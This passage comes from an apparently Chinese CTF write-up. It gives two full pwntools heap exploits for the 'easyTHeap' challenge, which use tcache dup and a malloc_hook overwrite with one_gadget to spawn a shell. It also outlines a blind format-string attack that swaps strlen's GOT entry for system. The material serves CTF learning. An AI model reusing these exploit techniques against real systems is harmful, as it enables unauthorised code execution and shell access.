class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;vn_pwn_easyTHeap&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">28200</span><br><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, data</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 0</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 1</span><br><br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-comment"># leak heap addr</span><br>	dp(<span class="hljs-number">0</span>)<br>	heap_base = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>) + <span class="hljs-string">&#x27;\x00\x00&#x27;</span>) - <span class="hljs-number">0x260</span><br>	li(<span class="hljs-string">&#x27;heap_base &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 2 for ajust</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 3</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># 4 teache count as -1, so free chunk will not be teache bin</span><br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-comment"># leak libc</span><br><br>	dp(<span class="hljs-number">0</span>)<br>	lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">96</span> - <span class="hljs-number">0x3ebc40</span><br>	li(<span class="hljs-string">&#x27;libc base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br>	ABS = lib.address + (<span class="hljs-number">0x7fd855098048</span> - <span class="hljs-number">0x7fd854cad000</span>)<br>	gadget = [<span class="hljs-number">0x4f2c5</span>, <span class="hljs-number">0x4f322</span>, <span class="hljs-number">0xe569f</span>, <span class="hljs-number">0xe5858</span>, <span class="hljs-number">0xe585f</span>, <span class="hljs-number">0xef863</span>, <span class="hljs-number">0x10a38c</span>, <span class="hljs-number">0x10a398</span>]<br>	one_gadget = lib.address + gadget[<span class="hljs-number">1</span>]<br><br>	<span class="hljs-comment"># can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span><br><br>	md(<span class="hljs-number">3</span>, p64(ABS))<br><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 5 for ajust</span><br>	li(<span class="hljs-string">&#x27;ABS_got &#x27;</span> + <span class="hljs-built_in">hex</span>(ABS))<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment"># idx 6, malloc to our addr</span><br><br>	p = p64(one_gadget)<br>	<span class="hljs-comment">#db()</span><br>	md(<span class="hljs-number">6</span>, p)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r14] == NULL || r14 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [[rax]] == NULL || [rax] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>



<h2 id="打法3"><a href="#打法3" class="headerlink" title="打法3"></a>打法3</h2><p>评估: </p>
<p>复杂度: 一般  成功率: 高</p>
<p>上面那个两个都没有控制好malloc的次数,多了一个,这个就控制少了一个,所以直接修改realloc_hook和malloc_hook打one_gadget.</p>
<h3 id="知识点-7"><a href="#知识点-7" class="headerlink" title="知识点"></a>知识点</h3><p>tcache管理机制</p>
<h3 id="思路-9"><a href="#思路-9" class="headerlink" title="思路"></a>思路</h3><p>程序中限制了malloc 和 free 的次数, 存在明显的uaf漏洞, 但是可以首先利用Tcache dup泄露heap 地址,且也使该方法打入tcache 管理头部,也就是堆的头部,修改tcahe的数量为7,在释放堆块的时候就不会由tcache bin来管理.这样可以泄漏libc,再次修改该结构,使bin指向malloc - 8处,下次分配直接修改该地址,realloc调参数打one_gadget</p>
<h3 id="exp-3"><a href="#exp-3" class="headerlink" title="exp-3"></a>exp-3</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><span class="hljs-comment">#-*- coding:utf-8 -*-</span><br><span class="hljs-comment"># Author: I0gan</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-comment">#from LibcSearcher import LibcSearcher</span><br><br>context.log_level=<span class="hljs-string">&#x27;debug&#x27;</span><br><span class="hljs-comment">#context.terminal = [&#x27;konsole&#x27;, &#x27;-x&#x27;, &#x27;bash&#x27;, &#x27;c&#x27;]</span><br><span class="hljs-comment">#context.terminal = &#x27;konsole&#x27;</span><br><span class="hljs-comment">#context(arch = &#x27;i386&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><span class="hljs-comment">#context(arch = &#x27;amd64&#x27;, os = &#x27;linux&#x27;, log_level=&#x27;debug&#x27;)</span><br><br>exeFile = <span class="hljs-string">&#x27;vn_pwn_easyTHeap&#x27;</span><br>libFile = <span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span><br><br>remoteIp = <span class="hljs-string">&quot;node3.buuoj.cn&quot;</span><br>remotePort = <span class="hljs-number">28200</span><br><br><br>LOCAL = <span class="hljs-number">1</span><br>LIB   = <span class="hljs-number">1</span><br><br>r   =  <span class="hljs-keyword">lambda</span> x : io.recv(x)<br>ra  =  <span class="hljs-keyword">lambda</span>   : io.recvall()<br>rl  =  <span class="hljs-keyword">lambda</span>   : io.recvline(keepends = <span class="hljs-literal">True</span>)<br>ru  =  <span class="hljs-keyword">lambda</span> x : io.recvuntil(x, drop = <span class="hljs-literal">True</span>)<br>s   =  <span class="hljs-keyword">lambda</span> x : io.send(x)<br>sl  =  <span class="hljs-keyword">lambda</span> x : io.sendline(x)<br>sa  =  <span class="hljs-keyword">lambda</span> x, y : io.sendafter(x, y)<br>sla =  <span class="hljs-keyword">lambda</span> x, y : io.sendlineafter(x, y)<br>ia  =  <span class="hljs-keyword">lambda</span> : io.interactive()<br>c   =  <span class="hljs-keyword">lambda</span> : io.close()<br>li    = <span class="hljs-keyword">lambda</span> x : log.info(x)<br>db    = <span class="hljs-keyword">lambda</span>   : gdb.attach(io)<br><br><span class="hljs-comment">#--------------------------Func-----------------------------</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ad</span>(<span class="hljs-params">size</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">1</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(size))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">rm</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">4</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">md</span>(<span class="hljs-params">idx, data</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">2</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br>	sa(<span class="hljs-string">&#x27;:&#x27;</span>, data)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dp</span>(<span class="hljs-params">idx</span>):<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">3</span>))<br>	sla(<span class="hljs-string">&#x27;?&#x27;</span>, <span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">q</span>():<br>	sla(<span class="hljs-string">&#x27;choice: &#x27;</span>, <span class="hljs-built_in">str</span>(<span class="hljs-number">5</span>))	<br><br><span class="hljs-comment">#--------------------------Exploit--------------------------</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">exploit</span>():<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 0</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 1</span><br><br>	rm(<span class="hljs-number">0</span>)<br>	rm(<span class="hljs-number">0</span>)<br><br>	<span class="hljs-comment"># leak heap addr</span><br>	dp(<span class="hljs-number">0</span>)<br>	heap_base = u64(ru(<span class="hljs-string">&#x27;\n&#x27;</span>) + <span class="hljs-string">&#x27;\x00\x00&#x27;</span>) - <span class="hljs-number">0x260</span><br>	li(<span class="hljs-string">&#x27;heap_base &#x27;</span> + <span class="hljs-built_in">hex</span>(heap_base))<br><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#ixx 2</span><br>	md(<span class="hljs-number">2</span>, p64(heap_base + <span class="hljs-number">0x10</span>)) <span class="hljs-comment">#modify as heap base</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 3</span><br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 4</span><br>	p = p64(<span class="hljs-number">0x0</span>)<br>	p +=p64(<span class="hljs-number">0x0700000000000000</span>) <span class="hljs-comment"># set as max num so free not as tcache bin</span><br>	md(<span class="hljs-number">4</span>, p)<br>	rm(<span class="hljs-number">0</span>)<br>	<span class="hljs-comment">#leak libc</span><br>	dp(<span class="hljs-number">0</span>)<br>	lib.address = u64(ru(<span class="hljs-string">&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">5</span>:] + <span class="hljs-string">&#x27;\x7f\x00\x00&#x27;</span>) - <span class="hljs-number">96</span> - <span class="hljs-number">0x3ebc40</span><br>	li(<span class="hljs-string">&#x27;libc base &#x27;</span> + <span class="hljs-built_in">hex</span>(lib.address))<br>	gadget = [<span class="hljs-number">0x4f2c5</span>, <span class="hljs-number">0x4f322</span>, <span class="hljs-number">0xe569f</span>, <span class="hljs-number">0xe5858</span>, <span class="hljs-number">0xe585f</span>, <span class="hljs-number">0xef863</span>, <span class="hljs-number">0x10a38c</span>, <span class="hljs-number">0x10a398</span>]<br>	one_gadget = lib.address + gadget[<span class="hljs-number">1</span>]<br>	p = p64(<span class="hljs-number">0x0</span>)<br>	p +=p64(<span class="hljs-number">0x0700000000000000</span>) <span class="hljs-comment"># set as max num so free not as tcache bin</span><br>	p = p.ljust(<span class="hljs-number">0xB8</span>, <span class="hljs-string">&#x27;\x00&#x27;</span>)<br>	p += p64(lib.sym[<span class="hljs-string">&#x27;__malloc_hook&#x27;</span>] - <span class="hljs-number">8</span>)<br><br>	md(<span class="hljs-number">4</span>, p)<br>	ad(<span class="hljs-number">0x100</span>) <span class="hljs-comment">#idx 5</span><br>	p = p64(one_gadget)<br>	p += p64(lib.sym[<span class="hljs-string">&#x27;realloc&#x27;</span>] + <span class="hljs-number">8</span>)<br>	md(<span class="hljs-number">5</span>, p)<br>	<span class="hljs-comment">#get shell</span><br>	<span class="hljs-comment">#db()</span><br>	ad(<span class="hljs-number">0x1</span>)<br><br><br><br>	<span class="hljs-comment">## can&#x27;t malloc only to modify _IO_2_1_stdout vtable</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">finish</span>():<br>	ia()<br>	c()<br><br><span class="hljs-comment">#--------------------------Main-----------------------------</span><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>	<br>	<span class="hljs-keyword">if</span> LOCAL:<br>		exe = ELF(exeFile)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>			io = exe.process(env = &#123;<span class="hljs-string">&quot;LD_PRELOAD&quot;</span> : libFile&#125;)<br>		<span class="hljs-keyword">else</span>:<br>			io = exe.process()<br>	<br>	<span class="hljs-keyword">else</span>:<br>		exe = ELF(exeFile)<br>		io = remote(remoteIp, remotePort)<br>		<span class="hljs-keyword">if</span> LIB:<br>			lib = ELF(libFile)<br>	<br>	exploit()<br>	finish()<br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  rsp &amp; 0xf == 0</span><br><span class="hljs-string">  rcx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x40] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe569f execve(&quot;/bin/sh&quot;, r14, r12)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r14] == NULL || r14 == NULL</span><br><span class="hljs-string">  [r12] == NULL || r12 == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5858 execve(&quot;/bin/sh&quot;, [rbp-0x88], [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [[rbp-0x88]] == NULL || [rbp-0x88] == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe585f execve(&quot;/bin/sh&quot;, r10, [rbp-0x70])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL</span><br><span class="hljs-string">  [[rbp-0x70]] == NULL || [rbp-0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0xe5863 execve(&quot;/bin/sh&quot;, r10, rdx)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [r10] == NULL || r10 == NULL</span><br><span class="hljs-string">  [rdx] == NULL || rdx == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsp+0x70] == NULL</span><br><span class="hljs-string"></span><br><span class="hljs-string">0x10a398 execve(&quot;/bin/sh&quot;, rsi, [rax])</span><br><span class="hljs-string">constraints:</span><br><span class="hljs-string">  [rsi] == NULL || rsi == NULL</span><br><span class="hljs-string">  [[rax]] == NULL || [rax] == NULL</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><br></code></pre></td></tr></table></figure>



<h1 id="AXB-2019-fmt"><a href="#AXB-2019-fmt" class="headerlink" title="AXB_2019_fmt"></a>AXB_2019_fmt</h1><h2 id="来源-7"><a href="#来源-7" class="headerlink" title="来源"></a>来源</h2><p>AXB_2019</p>
<h2 id="难度-6"><a href="#难度-6" class="headerlink" title="难度"></a>难度</h2><p>4&#x2F; 10</p>
<h2 id="简单描述-6"><a href="#简单描述-6" class="headerlink" title="简单描述"></a>简单描述</h2><p>不给elf文件, 盲打.</p>
<h2 id="vul-8"><a href="#vul-8" class="headerlink" title="vul"></a>vul</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs bash">logan@LYXF:~/share/axb_fmt1$ nc node3.buuoj.cn 29458<br>Hello,I am a computer Repeater updated.<br>After a lot of machine learning,I know that the essence of man is a reread machine!<br>So I<span class="hljs-string">&#x27;ll answer whatever you say!</span><br><span class="hljs-string">Please tell me:%p %p</span><br><span class="hljs-string">Repeater:0x804888d 0xffde142f</span><br><span class="hljs-string"></span><br><span class="hljs-string">Please tell me:^c</span><br></code></pre></td></tr></table></figure>

<p>存在字符串漏洞, 输出4bytes的地址, 这是一个32位程序</p>
<h2 id="知识点-8"><a href="#知识点-8" class="headerlink" title="知识点"></a>知识点</h2><p>fmt vul的各种利用, fmt vul dump文件, fmt vul修改内存.</p>
<h2 id="思路-10"><a href="#思路-10" class="headerlink" title="思路"></a>思路</h2><p>先使用脚本算出偏移,然后编写dump脚本, 这是一个32 bit的程序,就从0x08048000开始dump内存然后写入本地文件中, 后面就简单得多了, 分析所dump的文件,发现strlen对字符串的长度进行判断, 采用字符串漏洞泄漏libc,随便找一个函数都行,计算偏移,然后再获取system函数, 修改strlen的got地址为system,再输入时输入’;&#x2F;bin&#x2F;sh’就行, 注意,因为strlen传入的时候, Repeater:也跟着传入, 在linux bash中以’; ‘来进行分割命令,所以相当于执行两次命令, 一个Repeater:和一个&#x2F;bin&#x2F;sh.</p>
